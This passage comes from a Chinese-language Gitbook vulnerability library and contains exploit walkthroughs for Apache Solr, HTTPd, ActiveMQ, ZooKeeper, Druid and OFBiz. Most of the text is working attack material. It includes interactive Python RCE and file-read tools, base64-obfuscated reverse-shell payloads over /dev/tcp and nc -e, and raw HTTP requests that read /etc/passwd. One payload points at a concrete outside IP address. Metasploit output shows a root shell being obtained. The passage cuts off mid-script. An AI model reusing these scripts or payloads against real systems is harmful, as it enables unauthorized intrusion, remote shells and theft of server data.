java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id 用户id=0(root) 组id=0(root) 组=0(root) 漏洞修复 将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html","title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","keywords":"","body":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 漏洞描述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 影响版本 [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 环境搭建 选择一个存在漏洞的版本 下载各版本Solr地址 这里复现使用的是 Apache Solr 7.7.0 进行复现 下载后执行以下命令进行环境部署 cd solr-7.7.0 ./bin/solr start -e cloud -force 然后一路回车，直至出现 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip 将 vuln.zip 进行上传 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 POC使用详情参考另一篇复现文章 漏洞利用POC [!NOTE] 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr 任意文件读取漏洞.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr 任意文件读取漏洞.html","title":"Apache Solr 任意文件读取漏洞","keywords":"","body":"Apache Solr 任意文件读取漏洞 漏洞描述 Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件 漏洞影响 [!NOTE] Apache Solr FOFA [!NOTE] title=\"Solr Admin\" 漏洞复现 访问 Solr Admin 管理员页面 获取core的信息 http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json 发送请求 请求包如下 POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} 再进行文件读取 请求包如下 POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Curl请求为 curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\" 漏洞利用POC [!NOTE] POC还是建立在未授权访问的情况下 import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mFile >>> 文件名称或目录 \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\":\"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在准备文件读取...... \\033[0m\".format(target_url)) if \"This\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 可能存在漏洞 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, core_name, File_name): vuln_url = target_url + \"/solr/{}/debug/dump?param=ContentStreams\".format(core_name) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'stream.url=file://{}'.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if \"No such file or directory\" in response.text: print(\"\\033[31m[x] 读取{}失败 \\033[0m\".format(File_name)) else: print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(json.loads(response.text)[\"streams\"][0][\"stream\"])) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(\"\\033[35mFile >>> \\033[0m\")) POC_3(target_url, core_name, File_name) Goby & POC 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Apache_Solr_Arbitrary_File_Read.json 参考文章 https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache HTTPd/":{"url":"book/Web服务器漏洞/Apache/Apache HTTPd/","title":"Apache HTTPd","keywords":"","body":"Apache HTTPd Apache HTTPd 换行解析漏洞 CVE-2017-15715 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html":{"url":"book/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html","title":"Apache HTTPd 换行解析漏洞 CVE-2017-15715","keywords":"","body":"Apache HTTPd 换行解析漏洞 CVE-2017-15715 漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞影响 [!NOTE] Apache HTTPd 2.4.0~2.4.29版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 漏洞复现 直接上传恶意文件会被拦截 抓包修改如下参数 响应为200，成功绕过 访问 http://xxx.xxx.xxx.xxx:8080/evil.php%0a 成功触发解析漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache ActiveMQ/":{"url":"book/Web服务器漏洞/Apache/Apache ActiveMQ/","title":"Apache ActiveMQ","keywords":"","body":"Apache ActiveMQ Apache ActiveMQ Console控制台 存在默认弱口令 Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache ActiveMQ/Apache ActiveMQ Console控制台默认弱口令.html":{"url":"book/Web服务器漏洞/Apache/Apache ActiveMQ/Apache ActiveMQ Console控制台默认弱口令.html","title":"Apache ActiveMQ Console控制台默认弱口令","keywords":"","body":"Apache ActiveMQ Console 存在默认弱口令 漏洞描述 Apache ActiveMQ Console 存在默认弱口令 admin:admin，进入控制台后可被进一步恶意利用 漏洞影响 [!NOTE] Apache ActiveMQ 漏洞复现 Apache ActiveMQ 默认开启了 8186 控制台 访问目标: http://xxx.xxx.xxx.xxx:8161/admin 使用默认口令 admin:admin Goby & POC [!NOTE] Apache ActiveMQ_Console Weak Password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache ActiveMQ/Apache ActiveMQ 反序列化漏洞 CVE-2015-5254.html":{"url":"book/Web服务器漏洞/Apache/Apache ActiveMQ/Apache ActiveMQ 反序列化漏洞 CVE-2015-5254.html","title":"Apache ActiveMQ 反序列化漏洞 CVE-2015-5254","keywords":"","body":"Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 漏洞影响 [!NOTE] Apache ActiveMQ 5.13.0之前5.x版本 漏洞复现 首先下载 jmet 下载链接 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external 对目标发送一个生成/tmp/vuln的 payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 访问 http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event 可以看到多了一条消息队列 点击这个信息触发文件创建 成功执行命令创建文件，也可以创建一个反弹shell的payload bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 (base64编码) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i} 发送payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172.21.231.183 61616 同样点击消息队列会触发命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache ZooKeeper/":{"url":"book/Web服务器漏洞/Apache/Apache ZooKeeper/","title":"Apache ZooKeeper","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache ZooKeeper/Apache ZooKeeper 未授权访问漏洞 CVE-2014-085.html":{"url":"book/Web服务器漏洞/Apache/Apache ZooKeeper/Apache ZooKeeper 未授权访问漏洞 CVE-2014-085.html","title":"Apache ZooKeeper 未授权访问漏洞 CVE-2014-085","keywords":"","body":"Apache ZooKeeper 未授权访问漏洞 CVE-2014-085 漏洞描述 默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据 漏洞影响 [!NOTE] Apache ZooKeeper 漏洞复现 Apache ZooKeeper 默认开放 2181端口 ,使用如下命令获取敏感数据 echo envi | nc xxx.xxx.xxx.xxx 2181 其他信息 1、stat：列出关于性能和连接的客户端的统计信息。 echo stat |ncat 127.0.0.1 2181 2、ruok：测试服务器是否运行在非错误状态。 echo ruok |ncat 127.0.0.1 2181 3、reqs：列出未完成的请求。 echo reqs |ncat 127.0.0.1 2181 　　 4、envi：打印有关服务环境的详细信息。 echo envi |ncat 127.0.0.1 2181 　　 5、dump：列出未完成的会话和临时节点。 echo dump |ncat 127.0.0.1 2181 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Druid/":{"url":"book/Web服务器漏洞/Apache/Apache Druid/","title":"Apache Druid","keywords":"","body":"Apache Druid Apache Druid 远程代码执行漏洞 CVE-2021-25646 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Druid/Apache Druid 远程代码执行漏洞 CVE-2021-25646.html":{"url":"book/Web服务器漏洞/Apache/Apache Druid/Apache Druid 远程代码执行漏洞 CVE-2021-25646.html","title":"Apache Druid 远程代码执行漏洞 CVE-2021-25646","keywords":"","body":"Apache Druid 远程代码执行漏洞 CVE-2021-25646 漏洞描述 Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。 Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。 Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码 漏洞影响 [!NOTE] Apache Druid 环境搭建 这里使用Docker来搭建环境 Docker下载链接: https://github.com/apache/druid/archive/druid-0.20.0.zip 下载之后进入目录 distribution\\docker 执行命令编译 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8888 正常就行了 漏洞复现 漏洞原理: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POC请求包 POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx​:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} [!NOTE] 注意请求中这个位置改为你的dnslog平台地址 java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn') 发送请求即可命令执行 [!NOTE] 看了下可能大部分都是docker搭建，而里面大部分命令是不存在的，但是发现docker里面居然默认是有 NC 命令的，那我们就可以用nc反弹一个shell了 反弹shell请求包 POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx​:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1008 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} 发送请求包就可以得到一个交互式shell了 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache OFBiz/":{"url":"book/Web服务器漏洞/Apache/Apache OFBiz/","title":"Apache OFBiz","keywords":"","body":"Apache OFBiz Apache OFBiz RMI反序列化漏洞 CVE-2021-26295 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache OFBiz/Apache OFBiz RMI反序列化漏洞 CVE-2021-26295.html":{"url":"book/Web服务器漏洞/Apache/Apache OFBiz/Apache OFBiz RMI反序列化漏洞 CVE-2021-26295.html","title":"Apache OFBiz RMI反序列化漏洞 CVE-2021-26295","keywords":"","body":"Apache OFBiz rmi反序列化漏洞 CVE-2021-26295 漏洞描述 OFBiz是基于Java的Web框架，包括实体引擎，服务引擎和基于小部件的UI。 近日，Apache OFBiz官方发布安全更新。Apache OFBiz 存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。 漏洞影响 [!NOTE] Apache OFBiz FOFA [!NOTE] app=\"Apache_OFBiz\" 环境搭建 docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz 漏洞复现 使用文章目录中的POC脚本 验证 Dnslog 反弹shell使用 ROME反序列化链就行了 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i &>/dev/tcp/81.68.139.186/9999 然后把数据填入下面的 反弹shell脚本中的Hex_data参数中运行脚本即可反弹shell 漏洞利用POC [!NOTE] 需要将POC放在与 ysoserial.jar 同一目录 一个为 dnslog检测，另一个为反弹shell import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache OFBiz 